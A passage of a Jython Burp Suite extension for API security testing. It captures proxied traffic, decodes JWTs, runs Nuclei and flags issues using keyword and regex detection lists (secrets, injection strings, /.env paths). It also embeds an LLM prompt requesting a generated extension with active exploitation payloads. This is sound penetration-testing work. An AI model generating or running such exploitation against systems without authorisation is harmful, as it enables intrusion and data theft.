                    return

                max_timeout = 600  # 10 min max

                SwingUtilities.invokeLater(
                    lambda: self.nuclei_area.append(
                        "[*] Scanning (max 10min)...\n\n"
                    )
                )

                # Wait with minimal progress updates
                start_wait = time_module.time()
                last_update = start_wait
                while process.poll() is None:
                    current = time_module.time()
                    elapsed = int(current - start_wait)
                    if elapsed > max_timeout:
                        try:
                            process.kill()
                            process.wait()
                        except Exception as e:
                            self._callbacks.printError("Kill failed: {}".format(str(e)))
                        SwingUtilities.invokeLater(
                            lambda: self.nuclei_area.append(
                                "\n[!] Timeout after {}min\n".format(max_timeout/60)
                            )
                        )
                        break
                    # Update every 30s only
                    if current - last_update > 30:
                        SwingUtilities.invokeLater(
                            lambda e=elapsed: self.nuclei_area.append(
                                "[*] {}s elapsed...\n".format(e)
                            )
                        )
                        last_update = current
                    time_module.sleep(2)

                process.wait()
                elapsed = int(time_module.time() - start_time)
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui(
                        "[*] Nuclei: {}s, exit code {}".format(
                            elapsed, process.returncode
                        )
                    )
                )

                # Parse JSON results and group by severity
                findings_by_severity = {'critical': [], 'high': [], 'medium': [], 'low': [], 'info': []}
                vuln_count = 0

                if os.path.exists(json_file):
                    try:
                        with open(json_file, "r") as f:
                            for line in f:
                                if line.strip():
                                    vuln_count += 1
                                    try:
                                        vuln = json.loads(line)
                                        severity = vuln.get('info', {}).get('severity', 'info').lower()
                                        template = vuln.get('template-id', 'unknown')
                                        matched = vuln.get('matched-at', vuln.get('host', ''))
                                        findings_by_severity.get(severity, findings_by_severity['info']).append(
                                            "[{}] {}".format(template, matched)
                                        )
                                    except Exception as json_err:
                                        self._callbacks.printError(
                                            "Nuclei JSON parse error: {}".format(str(json_err))
                                        )
                    except Exception as e:
                        self._callbacks.printError("Error reading JSON: {}".format(str(e)))

                result = ["\n" + "=" * 80, "NUCLEI SCAN RESULTS", "=" * 80, ""]
                result.append("[*] Scan Time: {}s".format(elapsed))
                result.append("[*] Targets: {}".format(target_count))
                result.append("[*] Total Findings: {}".format(vuln_count))
                result.append("")

                if vuln_count > 0:
                    for severity in ['critical', 'high', 'medium', 'low', 'info']:
                        findings = findings_by_severity[severity]
                        if findings:
                            result.append("=" * 80)
                            result.append("{} - {} findings".format(severity.upper(), len(findings)))
                            result.append("=" * 80)
                            for finding in findings[:10]:
                                result.append(finding)
                            if len(findings) > 10:
                                result.append("... ({} more)".format(len(findings) - 10))
                            result.append("")

                    result.append("=" * 80)
                    result.append("SUMMARY")
                    result.append("=" * 80)
                    for severity in ['critical', 'high', 'medium', 'low', 'info']:
                        count = len(findings_by_severity[severity])
                        if count > 0:
                            pct = int((count / float(vuln_count)) * 100)
                            result.append("[+] {}: {} ({}%)".format(severity.upper(), count, pct))

                    result.append("")
                    result.append("[*] Key Actions:")
                    if findings_by_severity['critical']:
                        result.append("    - Address {} critical vulnerabilities immediately".format(len(findings_by_severity['critical'])))
                    if findings_by_severity['high']:
                        result.append("    - Review {} high severity findings".format(len(findings_by_severity['high'])))
                    result.append("    - Full results: {}".format(json_file))

                    SwingUtilities.invokeLater(
                        lambda: self.log_to_ui("[+] Found {} vulnerabilities".format(vuln_count))
                    )
                else:
                    result.append("[+] No vulnerabilities found")
                    result.append("[*] All {} targets scanned successfully".format(target_count))
                    SwingUtilities.invokeLater(
                        lambda: self.log_to_ui("[+] No vulnerabilities")
                    )

                SwingUtilities.invokeLater(
                    lambda: self.nuclei_area.append("\n".join(result))
                )
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui("[+] Complete: {}".format(output_file))
                )
            except Exception as e:
                err = "[!] Failed: {}\n\nCheck: nuclei -version".format(str(e))
                SwingUtilities.invokeLater(lambda: self.nuclei_area.setText(err))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui("[!] Error: {}".format(str(e)))
                )
            finally:
                try:
                    import shutil
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except Exception as e:
                    self._callbacks.printError("Cleanup error: {}".format(str(e)))

        thread = threading.Thread(target=run_scan)
        thread.daemon = True
        thread.start()

    def getTabCaption(self):
        with self.lock:
            count = len(self.api_data)
        return (
            "API Security Suite"
            if count == 0
            else "API Security Suite ({})".format(count)
        )

    def getUiComponent(self):
        return self._panel

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not self.auto_capture.isSelected():
            return
        if not messageIsRequest:
            self._process_traffic(messageInfo)

    def processProxyMessage(self, messageIsRequest, message):
        if not self.auto_capture.isSelected():
            return
        if not messageIsRequest:
            self._process_traffic(message.getMessageInfo())

    def _process_traffic(self, messageInfo):
        try:
            if not messageInfo:
                return
            request = messageInfo.getRequest()
            response = messageInfo.getResponse()
            if not request:
                self._callbacks.printOutput("[DEBUG] Skipped: No request")
                return
            if not response:
                self._callbacks.printOutput("[DEBUG] Skipped: No response")
                return

            start_time = time.time()
            req_info = self._helpers.analyzeRequest(messageInfo)
            resp_info = self._helpers.analyzeResponse(response)

            url = req_info.getUrl()
            method = req_info.getMethod()
            path = url.getPath()

            # Filter only obvious noise: images and fonts
            path_lower = path.lower()
            if any(
                path_lower.endswith(ext)
                for ext in [
                    ".jpg",
                    ".jpeg",
                    ".png",
                    ".gif",
                    ".webp",
                    ".svg",
                    ".ico",
                    ".woff",
                    ".woff2",
                    ".ttf",
                ]
            ):
                return

            # Normalize path for grouping
            normalized_path = self._normalize_path(path)
            endpoint_key = "{}:{}".format(method, normalized_path)

            # Memory limit check with rotation
            with self.lock:
                if len(self.api_data) >= self.max_endpoints:
                    # Remove 10% oldest endpoints
                    to_remove = int(self.max_endpoints * 0.1)
                    # Create snapshot to avoid modification during iteration
                    times_snapshot = list(self.endpoint_times.items())
                    oldest = sorted(
                        times_snapshot,
                        key=lambda x: min(x[1]) if isinstance(x[1], list) else x[1],
                    )[:to_remove]
                    for key, _ in oldest:
                        self.api_data.pop(key, None)
                        self.endpoint_times.pop(key, None)
                        self.endpoint_tags.pop(key, None)
                    self.log_to_ui(
                        "[*] Rotated {} old endpoints (limit: {})".format(
                            to_remove, self.max_endpoints
                        )
                    )

            # Limit samples per endpoint
            max_samples = int(str(self.sample_limit.getSelectedItem()))
            with self.lock:
                if (
                    endpoint_key in self.api_data
                    and len(self.api_data[endpoint_key]) >= max_samples
                ):
                    return

            # Extract comprehensive data
            req_body = self._extract_body(request, req_info.getBodyOffset())
            resp_body = self._extract_body(response, resp_info.getBodyOffset())
            content_type = self._get_content_type(resp_info)

            response_time = int((time.time() - start_time) * 1000)

            api_entry = {
                "method": method,
                "path": path,
                "normalized_path": normalized_path,
                "host": url.getHost(),
                "protocol": url.getProtocol(),
                "port": url.getPort(),
                "query_string": url.getQuery() or "",
                "parameters": self._extract_params(req_info),
                "headers": self._extract_headers(req_info),
                "request_body": req_body,
                "response_status": resp_info.getStatusCode(),
                "response_headers": self._extract_response_headers(resp_info),
                "response_body": resp_body,
                "response_length": max(0, len(response) - resp_info.getBodyOffset()),
                "response_time_ms": response_time,
                "content_type": content_type,
                "auth_detected": self._detect_auth(req_info),
                "api_patterns": self._detect_api_patterns(
                    path, content_type, resp_body
                ),
                "jwt_detected": self._extract_jwt(req_info),
                "encryption_indicators": self._detect_encryption(
                    req_body, resp_body, self._extract_headers(req_info)
                ),
                "param_patterns": self._analyze_param_patterns(
                    req_info, req_body, resp_body
                ),
            }

            is_new = False
            with self.lock:
                if endpoint_key not in self.api_data:
                    self.api_data[endpoint_key] = []
                    self.endpoint_tags[endpoint_key] = self._auto_tag(api_entry)
                    self.endpoint_times[endpoint_key] = []
                    is_new = True
                self.api_data[endpoint_key].append(api_entry)
                self.endpoint_times[endpoint_key].append(response_time)

            count = len(self.api_data)
            self._callbacks.setExtensionName(
                "API Recon" if count == 0 else "API Recon ({})".format(count)
            )

            if is_new:
                SwingUtilities.invokeLater(
                    lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
                )
                severity = self._get_severity(endpoint_key, [api_entry])
                if severity == "critical":
                    self.log_to_ui(
                        "[!] CRITICAL: {} {} @ {} (Total: {})".format(
                            method, normalized_path, url.getHost(), len(self.api_data)
                        )
                    )
                elif severity == "high":
                    self.log_to_ui(
                        "[!] HIGH: {} {} @ {} (Total: {})".format(
                            method, normalized_path, url.getHost(), len(self.api_data)
                        )
                    )
                elif severity == "medium":
                    self.log_to_ui(
                        "[*] MEDIUM: {} {} @ {} (Total: {})".format(
                            method, normalized_path, url.getHost(), len(self.api_data)
                        )
                    )
                else:
                    self.log_to_ui(
                        "[+] Captured: {} {} @ {} (Total: {})".format(
                            method, normalized_path, url.getHost(), len(self.api_data)
                        )
                    )
                SwingUtilities.invokeLater(lambda: self._update_host_filter())
                SwingUtilities.invokeLater(lambda: self._update_stats())
                SwingUtilities.invokeLater(lambda: self.refresh_view())

        except Exception as e:
            self._callbacks.printError("Error processing: " + str(e))

    def _normalize_path(self, path):
        # Use pre-compiled patterns for better performance
        path = self.NUMERIC_ID_PATTERN.sub("/{id}", path)
        path = self.UUID_PATTERN.sub("/{uuid}", path)
        path = self.OBJECTID_PATTERN.sub("/{objectid}", path)
        return path

    def _extract_params(self, req_info):
        params = {"url": {}, "body": {}, "cookie": {}, "json": {}}
        try:
            for param in req_info.getParameters()[:50]:  # Limit to 50 params
                ptype = param.getType()
                name = (param.getName() or "")[:100]  # Limit name length
                value = (param.getValue() or "")[:1000]  # Limit value length
                if ptype == self.PARAM_URL:
                    params["url"][name] = value
                elif ptype == self.PARAM_BODY:
                    params["body"][name] = value
                elif ptype == self.PARAM_COOKIE:
                    params["cookie"][name] = value
                elif ptype == self.PARAM_JSON:
                    params["json"][name] = value
        except Exception as e:
            self._callbacks.printError("Param extraction error: " + str(e))
        return params

    def _extract_headers(self, req_info):
        headers = {}
        try:
            for header in req_info.getHeaders()[1:20]:  # Limit to 20 headers
                if ":" in header:
                    key, val = header.split(":", 1)
                    headers[key.strip()] = val.strip()[:500]  # Limit header value size
        except Exception as e:
            self._callbacks.printError("Header extraction error: " + str(e))
        return headers

    def _extract_response_headers(self, resp_info):
        headers = {}
        try:
            for header in resp_info.getHeaders()[1:20]:  # Limit to 20 headers
                if ":" in header:
                    key, val = header.split(":", 1)
                    headers[key.strip()] = val.strip()[:500]  # Limit header value size
        except Exception as e:
            self._callbacks.printError("Response header extraction error: " + str(e))
        return headers

    def _extract_body(self, message, offset):
        try:
            if not message or offset < 0:
                return ""
            body_bytes = message[offset : offset + self.max_body_size]
            body = self._helpers.bytesToString(body_bytes)
            if len(body) > self.max_body_size:
                body = body[: self.max_body_size] + "... [truncated]"
            return body
        except Exception as e:
            self._callbacks.printError("Body extraction error: " + str(e))
            return ""

    def _get_content_type(self, resp_info):
        for header in resp_info.getHeaders()[:30]:
            if header.lower().startswith("content-type:"):
                return header.split(":", 1)[1].strip()
        return "unknown"

    def _detect_auth(self, req_info):
        auth_types = []
        for header in req_info.getHeaders()[1:30]:
            lower = header.lower()
            if "authorization:" in lower:
                if "bearer" in lower:
                    auth_types.append("Bearer Token")
                elif "basic" in lower:
                    auth_types.append("Basic Auth")
                else:
                    auth_types.append("Custom Auth")
            elif "x-api-key:" in lower:
                auth_types.append("API Key")
            elif "cookie:" in lower:
                auth_types.append("Session Cookie")
        return auth_types if auth_types else ["None"]

    def _extract_jwt(self, req_info):
        """Extract and decode JWT tokens from Authorization header, cookies, params, and body"""
        import base64

        def decode_jwt(token):
            try:
                parts = token.strip().split(".")
                if len(parts) != 3:
                    return None
                header_data = base64.urlsafe_b64decode(parts[0] + "===")
                payload_data = base64.urlsafe_b64decode(parts[1] + "===")
                return {
                    "raw": token,
                    "header": json.loads(header_data),
                    "payload": json.loads(payload_data),
                    "signature": parts[2],
                    "location": ""
                }
            except Exception:
                return None

        # Check Authorization header
        for header in req_info.getHeaders()[1:30]:
            if "authorization:" in header.lower():
                if "bearer" in header.lower():
                    token = header.split(" ")[-1]
                    jwt = decode_jwt(token)
                    if jwt:
                        jwt["location"] = "Authorization: Bearer"
                        return jwt

        # Check cookies
        for param in req_info.getParameters():
            if param.getType() == self.PARAM_COOKIE:
                token = param.getValue() or ""
                if token.count(".") == 2:
                    jwt = decode_jwt(token)
                    if jwt:
                        jwt["location"] = "Cookie: {}".format(param.getName())
                        return jwt

        # Check URL params
        for param in req_info.getParameters():
            if param.getType() == self.PARAM_URL:
                name = (param.getName() or "").lower()
                if "token" in name or "jwt" in name or "auth" in name:
                    token = param.getValue() or ""
                    jwt = decode_jwt(token)
                    if jwt:
                        jwt["location"] = "URL param: {}".format(param.getName())
                        return jwt

        return None

    def _detect_encryption(self, req_body, resp_body, headers):
        indicators = {"likely_encrypted": False, "types": [], "evidence": []}
        req_body = req_body or ""
        resp_body = resp_body or ""
        combined = req_body + resp_body
        if self.BASE64_PATTERN.search(combined):
            indicators["types"].append("Base64")
        if self.HEX_PATTERN.search(combined):
            indicators["types"].append("Hex")
        for key in headers:
            if any(
                x in key.lower() for x in ["encryption", "cipher", "signature", "hash"]
            ):
                indicators["types"].append("Custom Header")
                break
        if any(x in combined.lower() for x in ["encrypted", "cipher", "hmac"]):
            indicators["types"].append("Keyword")
        indicators["likely_encrypted"] = len(indicators["types"]) > 0
        return indicators

    def _analyze_param_patterns(self, req_info, req_body, resp_body):
        patterns = {"param_types": {}, "reflected": []}
        resp_body = resp_body or ""
        for param in req_info.getParameters()[:50]:
            name = param.getName() or ""
            value = param.getValue() or ""
            if value and re.match(r"^\d+$", value):
                patterns["param_types"][name] = "numeric"
            elif value and re.match(r"^[0-9a-f-]{36}$", value):
                patterns["param_types"][name] = "uuid"
            elif value and re.match(r"^[A-Za-z0-9+/=]{20,}$", value):
                patterns["param_types"][name] = "base64"
            elif value and re.match(r"^[0-9a-f]{32,}$", value):
                patterns["param_types"][name] = "hash"
            if value and len(value) > 3 and value in resp_body:
                patterns["reflected"].append(name)
        return patterns

    def _detect_api_patterns(self, path, content_type, response_body):
        patterns = []
        response_body = response_body or ""
        content_type = content_type or ""

        # REST patterns
        if any(x in path.lower() for x in ["/api/", "/v1/", "/v2/", "/rest/"]):
            patterns.append("REST API")

        # GraphQL
        if "/graphql" in path.lower():
            patterns.append("GraphQL")

        # SOAP
        if "<soap:" in response_body.lower() or "<wsdl:" in response_body.lower():
            patterns.append("SOAP")

        # JSON API
        if "json" in content_type.lower():
            patterns.append("JSON API")

        # XML API
        if "xml" in content_type.lower():
            patterns.append("XML API")

        return patterns if patterns else ["Unknown"]

    def export_api_data(self):
        if not self.api_data:
            self.log_to_ui("[!] No API data to export")
            return

        timestamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        self.log_to_ui("[*] Starting export at {}...".format(timestamp))

        with self.lock:
            data_snapshot = dict(self.api_data)

        # Generate comprehensive analysis
        analysis = {
            "metadata": {
                "timestamp": timestamp,
                "total_endpoints": len(data_snapshot),
                "total_requests": sum(len(v) for v in data_snapshot.values()),
            },
            "endpoints": [],
            "api_structure": self._analyze_structure_for(data_snapshot),
            "security_observations": self._analyze_security(),
            "llm_prompt": self._generate_llm_prompt(),
        }

        for endpoint_key, entries in data_snapshot.items():
            entry = self._get_entry(entries)
            entries_list = entries if isinstance(entries, list) else [entries]
            endpoint_summary = {
                "endpoint": endpoint_key,
                "method": entry["method"],
                "normalized_path": entry["normalized_path"],
                "host": entry["host"],
                "sample_count": len(entries_list),
                "parameters": self._merge_params(entries_list),
                "auth_methods": list(
                    set([a for e in entries_list for a in e["auth_detected"]])
                ),
                "response_codes": list(
                    set([e["response_status"] for e in entries_list])
                ),
                "content_types": list(set([e["content_type"] for e in entries_list])),
                "api_patterns": list(
                    set([p for e in entries_list for p in e["api_patterns"]])
                ),
                "avg_response_length": sum(e["response_length"] for e in entries_list)
                / len(entries_list),
                "jwt_claims": entry.get("jwt_detected"),
                "encryption_detected": any(
                    e.get("encryption_indicators", {}).get("likely_encrypted")
                    for e in entries_list
                ),
                "encryption_types": list(
                    set(
                        [
                            t
                            for e in entries_list
                            for t in e.get("encryption_indicators", {}).get("types", [])
                        ]
                    )
                ),
                "reflected_params": list(
                    set(
                        [
                            p
                            for e in entries_list
                            for p in e.get("param_patterns", {}).get("reflected", [])
                        ]
                    )
                ),
                "param_type_summary": self._summarize_param_types(entries_list),
                "sample_requests": [self._format_sample(e) for e in entries_list[:3]],
            }
            analysis["endpoints"].append(endpoint_summary)

        # Export to file
        import os

        export_dir = self._get_export_dir("FullExport")
        if not export_dir:
            self.log_to_ui("[!] Cannot create export directory")
            return

        self.log_to_ui("[*] Analyzing {} endpoints...".format(len(data_snapshot)))

        # Count severities
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "info": 0}
        for key, entries in data_snapshot.items():
            sev = self._get_severity(key, entries)
            severity_counts[sev] += 1

        filename = os.path.join(export_dir, "api_analysis.json")
        writer = None
        try:
            writer = FileWriter(filename)
            writer.write(json.dumps(analysis, indent=2))
            self.log_to_ui(
                "[+] Export complete: {} endpoints, {} requests".format(
                    analysis["metadata"]["total_endpoints"],
                    analysis["metadata"]["total_requests"],
                )
            )
            self.log_to_ui(
                "[+] Severity: Critical={}, High={}, Medium={}, Info={}".format(
                    severity_counts["critical"],
                    severity_counts["high"],
                    severity_counts["medium"],
                    severity_counts["info"],
                )
            )
            self.log_to_ui(
                "[+] Security observations: {}".format(
                    len(analysis["security_observations"])
                )
            )
            self.log_to_ui("[+] Folder: {}".format(export_dir))
            self.log_to_ui("[+] File: {}".format(filename))
        except (IOError, TypeError) as e:
            self.log_to_ui("[!] Export failed: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError("Error closing file: " + str(e))

    def _merge_params(self, entries):
        merged = {"url": set(), "body": set(), "cookie": set(), "json": set()}
        for entry in entries:
            for ptype, params in entry.get("parameters", {}).items():
                if isinstance(params, dict):
                    merged[ptype].update(params.keys())
                elif isinstance(params, list):
                    merged[ptype].update(params)
        return {k: list(v) for k, v in merged.items()}

    def _format_sample(self, entry):
        return {
            "method": entry.get("method", ""),
            "path": entry.get("path", ""),
            "query": entry.get("query_string", ""),
            "headers": entry.get("headers", {}),
            "request_body": (entry.get("request_body") or "")[:500],
            "response_status": entry.get("response_status", 200),
            "response_body": (entry.get("response_body") or "")[:500],
        }

    def _summarize_param_types(self, entries):
        summary = {}
        for entry in entries:
            for pname, ptype in (
                entry.get("param_patterns", {}).get("param_types", {}).items()
            ):
                if pname not in summary:
                    summary[pname] = set()
                summary[pname].add(ptype)
        return {k: list(v)[0] if len(v) == 1 else list(v) for k, v in summary.items()}

    def _analyze_structure(self):
        structure = {
            "api_types": set(),
            "http_methods": set(),
            "auth_methods": set(),
            "base_paths": set(),
        }
        for entries in self.api_data.values():
            entries_list = entries if isinstance(entries, list) else [entries]
            for entry in entries_list:
                structure["http_methods"].add(entry.get("method", ""))
                structure["auth_methods"].update(entry.get("auth_detected", []))
                structure["api_types"].update(entry.get("api_patterns", []))
                path = entry.get("normalized_path", "")
                if path.startswith("/api/"):
                    structure["base_paths"].add("/api/")
                elif path.startswith("/v1/"):
                    structure["base_paths"].add("/v1/")
        return {k: list(v) for k, v in structure.items()}

    def _check_endpoints(self, check_func):
        """Helper to check endpoints and return matches"""
        matches = []
        for endpoint_key, entries in self.api_data.items():
            if check_func(endpoint_key, entries):
                matches.append(endpoint_key)
        return matches

    def _add_observation(
        self, observations, matches, obs_type, severity, recommendation=None
    ):
        """Helper to add observation if matches found"""
        if matches:
            obs = {
                "type": obs_type,
                "severity": severity,
                "count": len(matches),
                "examples": matches[:5],
            }
            if recommendation:
                obs["recommendation"] = recommendation
            observations.append(obs)

    def _analyze_security(self):
        observations = []

        with self.lock:
            data_snapshot = dict(self.api_data)

        # Process snapshot without holding lock
        def check_snapshot(check_func):
            matches = []
            for key, entries in data_snapshot.items():
                if check_func(key, entries):
                    matches.append(key)
            return matches

        # Unprotected endpoints
        self._add_observation(
            observations,
            check_snapshot(lambda k, e: any("None" in x["auth_detected"] for x in e)),
            "Unauthenticated Endpoints",
            "High",
        )

        # IDOR/BOLA
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: len(e) > 0
                and re.search(r"/{id}|/{uuid}|/\d+", e[0]["normalized_path"])
            ),
            "Potential IDOR/BOLA",
            "Critical",
            "Implement object-level authorization checks",
        )

        # Sensitive data
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    any(
                        p
                        in (
                            (x.get("request_body") or "")
                            + (x.get("response_body") or "")
                        ).lower()
                        for p in [
                            "password",
                            "token",
                            "secret",
                            "key",
                            "credit",
                            "ssn",
                            "email",
                            "phone",
                        ]
                    )
                    for x in e
                )
            ),
            "Sensitive Data Detected",
            "High",
            "Encrypt sensitive data and use proper masking",
        )

        # PII in URLs
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    re.search(
                        r"email=|phone=|ssn=|credit",
                        (x.get("query_string") or "").lower(),
                    )
                    for x in e
                )
            ),
            "PII in URL Parameters",
            "High",
            "Move PII to request body with POST method",
        )

        # Verbose errors
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    any(
                        x in (entry.get("response_body") or "").lower()
                        for x in [
                            "stack trace",
                            "exception",
                            "sql",
                            "debug",
                            "traceback",
                        ]
                    )
                    for entry in e
                )
            ),
            "Verbose Error Messages",
            "Medium",
            "Implement generic error messages for production",
        )

        # Error responses
        error_endpoints = [
            (
                k,
                list(
                    set(
                        [
                            x.get("response_status", 200)
                            for x in e
                            if x.get("response_status", 200) >= 400
                        ]
                    )
                ),
            )
            for k, e in data_snapshot.items()
            if any(x.get("response_status", 200) >= 400 for x in e)
        ]
        if error_endpoints:
            observations.append(
                {
                    "type": "Error Responses Detected",
                    "severity": "Info",
                    "count": len(error_endpoints),
                    "examples": error_endpoints[:5],
                }
            )

        # Weak encryption
        weak_enc = [
            {
                "endpoint": k,
                "types": list(
                    set(
                        [
                            t
                            for x in e
                            for t in x.get("encryption_indicators", {}).get("types", [])
                        ]
                    )
                ),
            }
            for k, e in data_snapshot.items()
            if any(
                x.get("encryption_indicators", {}).get("likely_encrypted")
                and "Base64" in x.get("encryption_indicators", {}).get("types", [])
                for x in e
            )
        ]
        if weak_enc:
            observations.append(
                {
                    "type": "Weak Encryption (Base64)",
                    "severity": "High",
                    "count": len(weak_enc),
                    "examples": weak_enc[:5],
                    "recommendation": "Use proper encryption (AES-256, TLS 1.3)",
                }
            )

        # Rate limiting
        self._add_observation(
            observations,
            check_snapshot(lambda k, e: len(e) >= 3),
            "Potential Missing Rate Limiting",
            "Medium",
            "Implement rate limiting and throttling",
        )

        # CORS
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    (
                        x.get("response_headers", {}).get(
                            "Access-Control-Allow-Origin", ""
                        )
                        == "*"
                        or "null"
                        in x.get("response_headers", {})
                        .get("Access-Control-Allow-Origin", "")
                        .lower()
                    )
                    for x in e
                )
            ),
            "CORS Misconfiguration",
            "High",
            "Restrict CORS to specific origins, avoid wildcards",
        )

        # Security headers
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    not any(
                        h in x.get("response_headers", {})
                        for h in [
                            "X-Content-Type-Options",
                            "X-Frame-Options",
                            "Content-Security-Policy",
                        ]
                    )
                    for x in e
                )
            ),
            "Missing Security Headers",
            "Medium",
            "Add X-Content-Type-Options, X-Frame-Options, CSP headers",
        )

        # HTTP method misuse
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    x.get("method") == "GET" and x.get("request_body") for x in e
                )
            ),
            "HTTP Method Misuse",
            "Medium",
            "Use POST/PUT for requests with body data",
        )

        # Mass assignment
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    any(
                        p in (x.get("request_body") or "").lower()
                        for p in [
                            '"role"',
                            '"admin"',
                            '"isadmin"',
                            '"permissions"',
                            '"privileges"',
                        ]
                    )
                    for x in e
                )
            ),
            "Mass Assignment Risk",
            "High",
            "Whitelist allowed fields, reject unexpected parameters",
        )

        # Debug endpoints
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: len(e) > 0
                and any(
                    p in e[0]["normalized_path"].lower()
                    for p in [
                        "/debug",
                        "/test",
                        "/admin",
                        "/swagger",
                        "/api-docs",
                        "/.env",
                        "/config",
                    ]
                )
            ),
            "Debug/Admin Endpoints Exposed",
            "Critical",
            "Remove or properly secure debug/admin endpoints",
        )

        # Injection patterns
        self._add_observation(
            observations,
            check_snapshot(
                lambda k, e: any(
                    re.search(
                        r"(select|union|insert|delete|drop|exec|script|<|>|\.\.)",
                        str(x.get("parameters", {})),
                        re.IGNORECASE,
                    )
                    for x in e
                )
            ),
            "Injection Pattern Detected",
            "Critical",
            "Implement input validation and parameterized queries",
        )

        return observations

    def _generate_llm_prompt(self):
        return """# API Red Team Extension Generation

## Context
This JSON contains comprehensive API traffic analysis from a Burp Suite scan/capture session.

## Your Task
Analyze this API data and generate a custom Burp Suite extension in Jython that:

### 1. IDOR/BOLA Testing
- For endpoints with {id}, {uuid} patterns, test:
  * Sequential ID enumeration (1,2,3...)
  * UUID manipulation
  * Negative IDs and boundary values
  * Other user's resource access

### 2. Authentication/Authorization
- Test missing/invalid tokens
- Session fixation attacks
- JWT manipulation (alg:none, weak secrets)
- Privilege escalation attempts
- Cookie tampering

### 3. Parameter Manipulation
- Mass assignment (add admin=true, role=admin)
- Type confusion (string->int, array->object)
- SQL injection in all parameters
- NoSQL injection for JSON APIs
- Command injection in file paths
- XXE for XML endpoints

### 4. Business Logic
- Negative quantities/prices
- Race conditions on state changes
- Workflow bypass (skip payment steps)
- Rate limiting bypass

### 5. Encryption/Encoding
- Base64 decode/encode attacks
- Padding oracle attacks
- Replay attacks on encrypted data
- Weak crypto detection

### 6. Information Disclosure
- Verbose error messages
- Stack traces
- Debug endpoints
- API version disclosure

### 7. Injection Attacks
- Test reflected_params for XSS
- SSTI in template parameters
- LDAP injection
- XML injection

## Output Format
Generate a complete Burp extension that:
- Extends IBurpExtender, IScannerCheck
- Implements doPassiveScan (info gathering) and doActiveScan (exploitation)
- Returns IScanIssue objects with:
  * Severity: Critical/High/Medium/Low/Info
  * Confidence: Certain/Firm/Tentative
  * Detailed description with proof
  * Remediation advice
- Handles all detected patterns from security_observations
- Includes attack payloads specific to this API
- Provides clear documentation and usage instructions

## API Data Analysis Below
"""

    def _get_export_dir(self, export_type="Export"):
        import os

        timestamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        path = os.path.join(
            os.path.expanduser("~"),
            "burp_APIRecon",
            "{}_{}".format(export_type, timestamp),
        )
        try:
            f = File(path)
            if f.mkdirs() or f.exists():
                return path
        except Exception as e:
            self._callbacks.printError(
                "Failed to create directory {}: {}".format(path, str(e))
            )
        return None

    def clear_data(self):
        with self.lock:
            count = len(self.api_data)
            self.api_data.clear()
            self.endpoint_tags.clear()
            self.endpoint_times.clear()
        self.list_model.clear()
        self.details_area.setText("")
        self._callbacks.setExtensionName("API Recon")
        self.log_to_ui("[+] Cleared {} endpoints".format(count))
        SwingUtilities.invokeLater(
            lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
        )
        SwingUtilities.invokeLater(lambda: self._update_host_filter())
        SwingUtilities.invokeLater(lambda: self._update_stats())
        SwingUtilities.invokeLater(lambda: self.refresh_view())

    def _auto_tag(self, entry):
        tags = []
        if entry.get("encryption_indicators", {}).get("likely_encrypted"):
            tags.append("encrypted")
        if "None" not in entry.get("auth_detected", []):
            tags.append("authenticated")
        else:
            tags.append("public")
        if entry.get("response_status", 200) >= 400:
            tags.append("error")
        if entry.get("param_patterns", {}).get("reflected"):
            tags.append("reflected")
        return tags

    def _get_severity(self, key, entries):
        """Determine severity level for endpoint highlighting"""
        entry = self._get_entry(entries)
        path = entry["normalized_path"]

        # Critical
        if any(
            p in path.lower() for p in ["/debug", "/test", "/admin", "/.env", "/config"]
        ):
            return "critical"
        if re.search(r"/{id}|/{uuid}", path) and "None" in entry["auth_detected"]:
            return "critical"

        # High
        if re.search(r"/{id}|/{uuid}", path):
            return "high"
        if "None" in entry["auth_detected"]:
            return "high"
        if any(
            p
            in (entry.get("request_body", "") + entry.get("response_body", "")).lower()
            for p in ["password", "token", "secret"]
        ):
            return "high"
        if entry.get("encryption_indicators", {}).get(
            "likely_encrypted"
        ) and "Base64" in entry.get("encryption_indicators", {}).get("types", []):
            return "high"

        # Medium
        if entry.get("response_status", 200) >= 400:
            return "medium"
        if entry.get("param_patterns", {}).get("reflected"):
            return "medium"

        return "info"

    def _filter_endpoints(self):
        search = self.search_field.getText().lower()
        method = str(self.method_filter.getSelectedItem())
        host = str(self.host_filter.getSelectedItem())
        severity = str(self.severity_filter.getSelectedItem())
        filtered = {}

        for key, entries in self.api_data.items():
            if (
                search
                and search not in key.lower()
                and search not in self._get_entry(entries)["host"].lower()
            ):
                continue
            if method != "All" and not key.startswith(method + ":"):
                continue
            if host != "All" and self._get_entry(entries)["host"] != host:
                continue
            if (
                severity != "All"
                and self._get_severity(key, entries) != severity.lower()
            ):
                continue
            filtered[key] = entries
        return filtered

    def _on_filter_change(self):
        self.refresh_view()

    def _on_group_change(self):
        group = str(self.group_by.getSelectedItem())
        self.log_to_ui("[*] Grouping changed: {}".format(group))
        self.refresh_view()

    def _on_refresh(self):
        self.refresh_view()
        self.log_to_ui("[*] View refreshed")

    def _prev_page(self):
        if self.current_page > 0:
            self.current_page -= 1
            self.refresh_view()

    def _next_page(self):
        if self.current_page < self.total_pages - 1:
            self.current_page += 1
            self.refresh_view()

    def _change_page_size(self):
        self.page_size = int(str(self.page_size_combo.getSelectedItem()))
        self.current_page = 0
        self.refresh_view()

    def refresh_view(self):
        try:
            with self.lock:
                filtered = self._filter_endpoints()
